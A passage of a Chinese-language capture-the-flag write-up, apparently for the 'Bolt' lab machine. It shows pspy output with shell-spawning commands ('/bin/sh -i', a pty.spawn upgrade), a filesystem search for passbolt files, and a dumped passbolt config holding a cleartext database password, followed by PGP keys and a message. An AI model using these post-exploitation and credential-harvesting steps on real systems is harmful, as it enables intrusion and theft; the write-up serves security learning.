+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=590    | /usr/bin/VGAuthService [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [35;1mCMD: UID=102  PID=539    | /lib/systemd/systemd-timesyncd [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=101  PID=538    | /lib/systemd/systemd-resolved [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=454    | vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=416    | /lib/systemd/systemd-udevd [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=3985   | ./pspy64s [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3984   | dovecot/auth -w [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=396    | /lib/systemd/systemd-journald [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3901   | [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3803   | [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3588   | [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3495   | [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3492   | [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3462   | /usr/lib/udisks2/udisksd [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3456   | /usr/lib/upower/upowerd [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3449   | /usr/libexec/fwupd/fwupd [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=2915   | [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2822   | php-fpm: pool www                                                             [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=2683   | [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2460   | ./pspy64s [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2442   | ./pspy64s [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2388   | ./pspy64s [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2387   | /bin/sh -c cd /tmp;./pspy64s;echo 50437e61;pwd;echo c6d24 [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2386   | sh -c /bin/sh -c &#34;cd &#34;/tmp&#34;;./pspy64s;echo 50437e61;pwd;echo c6d24&#34; 2&gt;&amp;1 [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2353   | ./pspy64 [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2352   | /bin/sh -c cd /tmp;./pspy64 &gt; /tmp/pspy64.out;echo 50437e61;pwd;echo c6d24 [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2351   | sh -c /bin/sh -c &#34;cd &#34;/tmp&#34;;./pspy64 &gt; /tmp/pspy64.out;echo 50437e61;pwd;echo c6d24&#34; 2&gt;&amp;1 [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2189   | php-fpm: pool www                                                             [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2187   | php-fpm: pool www                                                             [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1904   | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1900   | /bin/bash [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1899   | python3 -c import pty;pty.spawn(&#34;/bin/bash&#34;) [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1856   | /bin/sh -i [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1855   | python3 /tmp/a.py [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1854   | /bin/sh -c python3 /tmp/a.py [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=129  PID=1782   | dovecot/auth [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1390   | php-fpm: pool www                                                             [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=129  PID=1384   | dovecot/stats [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1347   | gpg-agent --homedir /var/lib/passbolt/.gnupg --use-standard-socket --daemon [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [31;1mCMD: UID=128  PID=1251   | qmgr -l -t unix -u [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [31;1mCMD: UID=128  PID=1250   | pickup -l -t unix -u -c [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=1249   | /usr/lib/postfix/sbin/master -w [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1016   | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m
+</span></span><span class="line"><span class="cl">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=1      | /sbin/init splash [0m
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意到<code>gpg-agent --homedir /var/lib/passbolt/.gnupg --use-standard-socket --daemon</code>,好像是跟密钥管理有关的</p>
+<p><code>find /* | grep -i passbolt &gt; /dev/shm/find</code></p>
+<p>主要有以下三个目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/passbolt/
+</span></span><span class="line"><span class="cl">/usr/share/php/passbolt/
+</span></span><span class="line"><span class="cl">/var/lib/passbolt/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301941995.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301941995.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301941995.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301941995.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301941995.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301941995.png" /></p>
+<p><code>/etc/passbolt/passbolt.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;App&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// A base URL to use for absolute links.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// The url where the passbolt instance will be reachable to your end users.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// This information is need to render images in emails for example
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="s1">&#39;fullBaseUrl&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;https://passbolt.bolt.htb&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Database configuration.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;Datasources&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;default&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;host&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;port&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;3306&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;passbolt&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;rT2;jW7&lt;eY8!dX8}pQ8%&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;passboltdb&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Email configuration.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;EmailTransport&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;default&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;host&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;port&#39;</span> <span class="o">=&gt;</span> <span class="mi">587</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="k">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="k">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// Is this a secure connection? true if yes, null if no.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="s1">&#39;tls&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//&#39;timeout&#39; =&gt; 30,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">//&#39;client&#39; =&gt; null,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">//&#39;url&#39; =&gt; null,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Email&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;default&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// Defines the default name and email of the sender of the emails.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="s1">&#39;from&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">&#39;localhost@bolt.htb&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//&#39;charset&#39; =&gt; &#39;utf-8&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">//&#39;headerCharset&#39; =&gt; &#39;utf-8&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;passbolt&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// GPG Configuration.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// The keyring must to be owned and accessible by the webserver user.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// Example: www-data user on Debian
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="s1">&#39;gpg&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// Main server key.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="s1">&#39;serverKey&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// Server private key fingerprint.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="s1">&#39;fingerprint&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;59860A269E803FA094416753AB8E2EFB56A16C84&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;public&#39;</span> <span class="o">=&gt;</span> <span class="nx">CONFIG</span> <span class="o">.</span> <span class="nx">DS</span> <span class="o">.</span> <span class="s1">&#39;gpg&#39;</span> <span class="o">.</span> <span class="nx">DS</span> <span class="o">.</span> <span class="s1">&#39;serverkey.asc&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;private&#39;</span> <span class="o">=&gt;</span> <span class="nx">CONFIG</span> <span class="o">.</span> <span class="nx">DS</span> <span class="o">.</span> <span class="s1">&#39;gpg&#39;</span> <span class="o">.</span> <span class="nx">DS</span> <span class="o">.</span> <span class="s1">&#39;serverkey_private.asc&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;registration&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;public&#39;</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;ssl&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;force&#39;</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl"><span class="p">];</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302133323.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302133323.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302133323.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302133323.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302133323.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302133323.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-----BEGIN PGP MESSAGE-----
+</span></span><span class="line"><span class="cl">Version: OpenPGP.js v4.10.9
+</span></span><span class="line"><span class="cl">Comment: https://openpgpjs.org
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
+</span></span><span class="line"><span class="cl">g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
+</span></span><span class="line"><span class="cl">pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
+</span></span><span class="line"><span class="cl">oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
+</span></span><span class="line"><span class="cl">l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
+</span></span><span class="line"><span class="cl">zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
+</span></span><span class="line"><span class="cl">edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
+</span></span><span class="line"><span class="cl">l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
+</span></span><span class="line"><span class="cl">oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
+</span></span><span class="line"><span class="cl">FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
+</span></span><span class="line"><span class="cl">8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
+</span></span><span class="line"><span class="cl">5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
+</span></span><span class="line"><span class="cl">NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
+</span></span><span class="line"><span class="cl">Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
+</span></span><span class="line"><span class="cl">nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
+</span></span><span class="line"><span class="cl">TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
+</span></span><span class="line"><span class="cl">=P38i
+</span></span><span class="line"><span class="cl">-----END PGP MESSAGE-----
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到一个用加密后的信息,发送人为<code>eddie</code>,将该文件保存为<code>file.enc</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301943343.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301943343.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301943343.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301943343.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301943343.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301943343.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301947641.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301947641.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301947641.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301947641.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301947641.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301947641.png" /></p>
+<p><code>eddie@bolt.htb</code>的pgp公钥</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-----BEGIN PGP PUBLIC KEY BLOCK-----
+</span></span><span class="line"><span class="cl">Version: OpenPGP.js v4.10.9
+</span></span><span class="line"><span class="cl">Comment: https://openpgpjs.org
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">xsBNBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
+</span></span><span class="line"><span class="cl">fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk
+</span></span><span class="line"><span class="cl">cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU
+</span></span><span class="line"><span class="cl">RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU
+</span></span><span class="line"><span class="cl">+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a
+</span></span><span class="line"><span class="cl">If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB
+</span></span><span class="line"><span class="cl">AAHNHkVkZGllIEpvaG5zb24gPGVkZGllQGJvbHQuaHRiPsLAjQQQAQgAIAUC
+</span></span><span class="line"><span class="cl">YDgbYQYLCQcIAwIEFQgKAgQWAgEAAhkBAhsDAh4BACEJEBwnQaPcO0q9FiEE
+</span></span><span class="line"><span class="cl">30Jrx6Sor1jlDtoOHCdBo9w7Sr35DQf9HZOFYE3yug2TuEJY7q9QfwNrWhfJ
+</span></span><span class="line"><span class="cl">HmOwdM1kCKV5XnBic356DF/ViT3+pcWfIbWT8giYIZ/2qYfAd74S+gMKBim8
+</span></span><span class="line"><span class="cl">wBAH0J7WcnUI+py/zXxapGxBF0ufJtqrHmPaKsNaQVCEV3dDzTqlVRi0vfOD
+</span></span><span class="line"><span class="cl">Cm6kt3E8f8GPYK9Mh21gPjnhoPE1s23NzmBUiDt6wjZ2dOQ2cVagVnf6PyHM
+</span></span><span class="line"><span class="cl">WZLqUm8nQY342t3+AA6SFTw/YpwPPvjtZBBHf95BrSbpCE5Bjar9UyB+14x6
+</span></span><span class="line"><span class="cl">OUcWhkJu7QgySrCwAg2aKIBzsfWovcVTe9Rkpq/ty1tYOklT9kn75D9ttDF4
+</span></span><span class="line"><span class="cl">U8+Qz61kTICf987ATQRgOBthAQgAmlgcw3DqVzEBa5k9djPsUTJWOKVY5uox
+</span></span><span class="line"><span class="cl">oBp6X0H9njR9Ufb2XtmxZUUdV/uhtbnM0lSlNkeNNBX4c/Qny88vfkgb66xc
+</span></span><span class="line"><span class="cl">oOo4q+fNCEZfCmcS2AwMsUlzaPDQjowp4V+mWSc8JXq4GXOd/mrooibtiEdt
+</span></span><span class="line"><span class="cl">vK4pzMdvwGCykFqugyRDLksc1hfDYU+s5R42TNiMdW7OwYAplnOjgExOH8f1
+</span></span><span class="line"><span class="cl">lXVkqbsq5p54TbHe+0SdlfH5pJf4Gfwqj6dQlkSf3DMeEnByxEZX3imeKGrC
+</span></span><span class="line"><span class="cl">UmwLN4NHMeUs5EXuLnufut9aTMhbw/tetTtUXTHFk/zc7EhZDR1d3mkDV83c
+</span></span><span class="line"><span class="cl">tEUh6BuElwARAQABwsB2BBgBCAAJBQJgOBthAhsMACEJEBwnQaPcO0q9FiEE
+</span></span><span class="line"><span class="cl">30Jrx6Sor1jlDtoOHCdBo9w7Sr3+HQf/Qhrj6znyGkLbj9uUv0S1Q5fFx78z
+</span></span><span class="line"><span class="cl">5qEXRe4rvFC3APYE8T5/AzW7XWRJxRxzgDQB5yBRoGEuL49w4/UNwhGUklb8
+</span></span><span class="line"><span class="cl">IOuffRTHMPZxs8qVToKoEL/CRpiFHgoqQ9dJPJx1u5vWAX0AdOMvcCcPfVjc
+</span></span><span class="line"><span class="cl">PyHN73YWejb7Ji82CNtXZ1g9vO7D49rSgLoSNAKghJIkcG+GeAkhoCeU4BjC
+</span></span><span class="line"><span class="cl">/NdSM65Kmps6XOpigRottd7WB+sXpd5wyb+UyptwBsF7AISYycPvStDDQESg
+</span></span><span class="line"><span class="cl">pmGRRi3bQP6jGo1uP/k9wye/WMD0DrQqxch4lqCDk1n7OFIYlCSBOHU0rE/1
+</span></span><span class="line"><span class="cl">tD0sGGFpQMsI+Q==
+</span></span><span class="line"><span class="cl">=+pbw
+</span></span><span class="line"><span class="cl">-----END PGP PUBLIC KEY BLOCK-----
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将该文件保存为<code>eddie.pub</code></p>
+<p><code>clark@bolt.htb</code>的pgp公钥</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
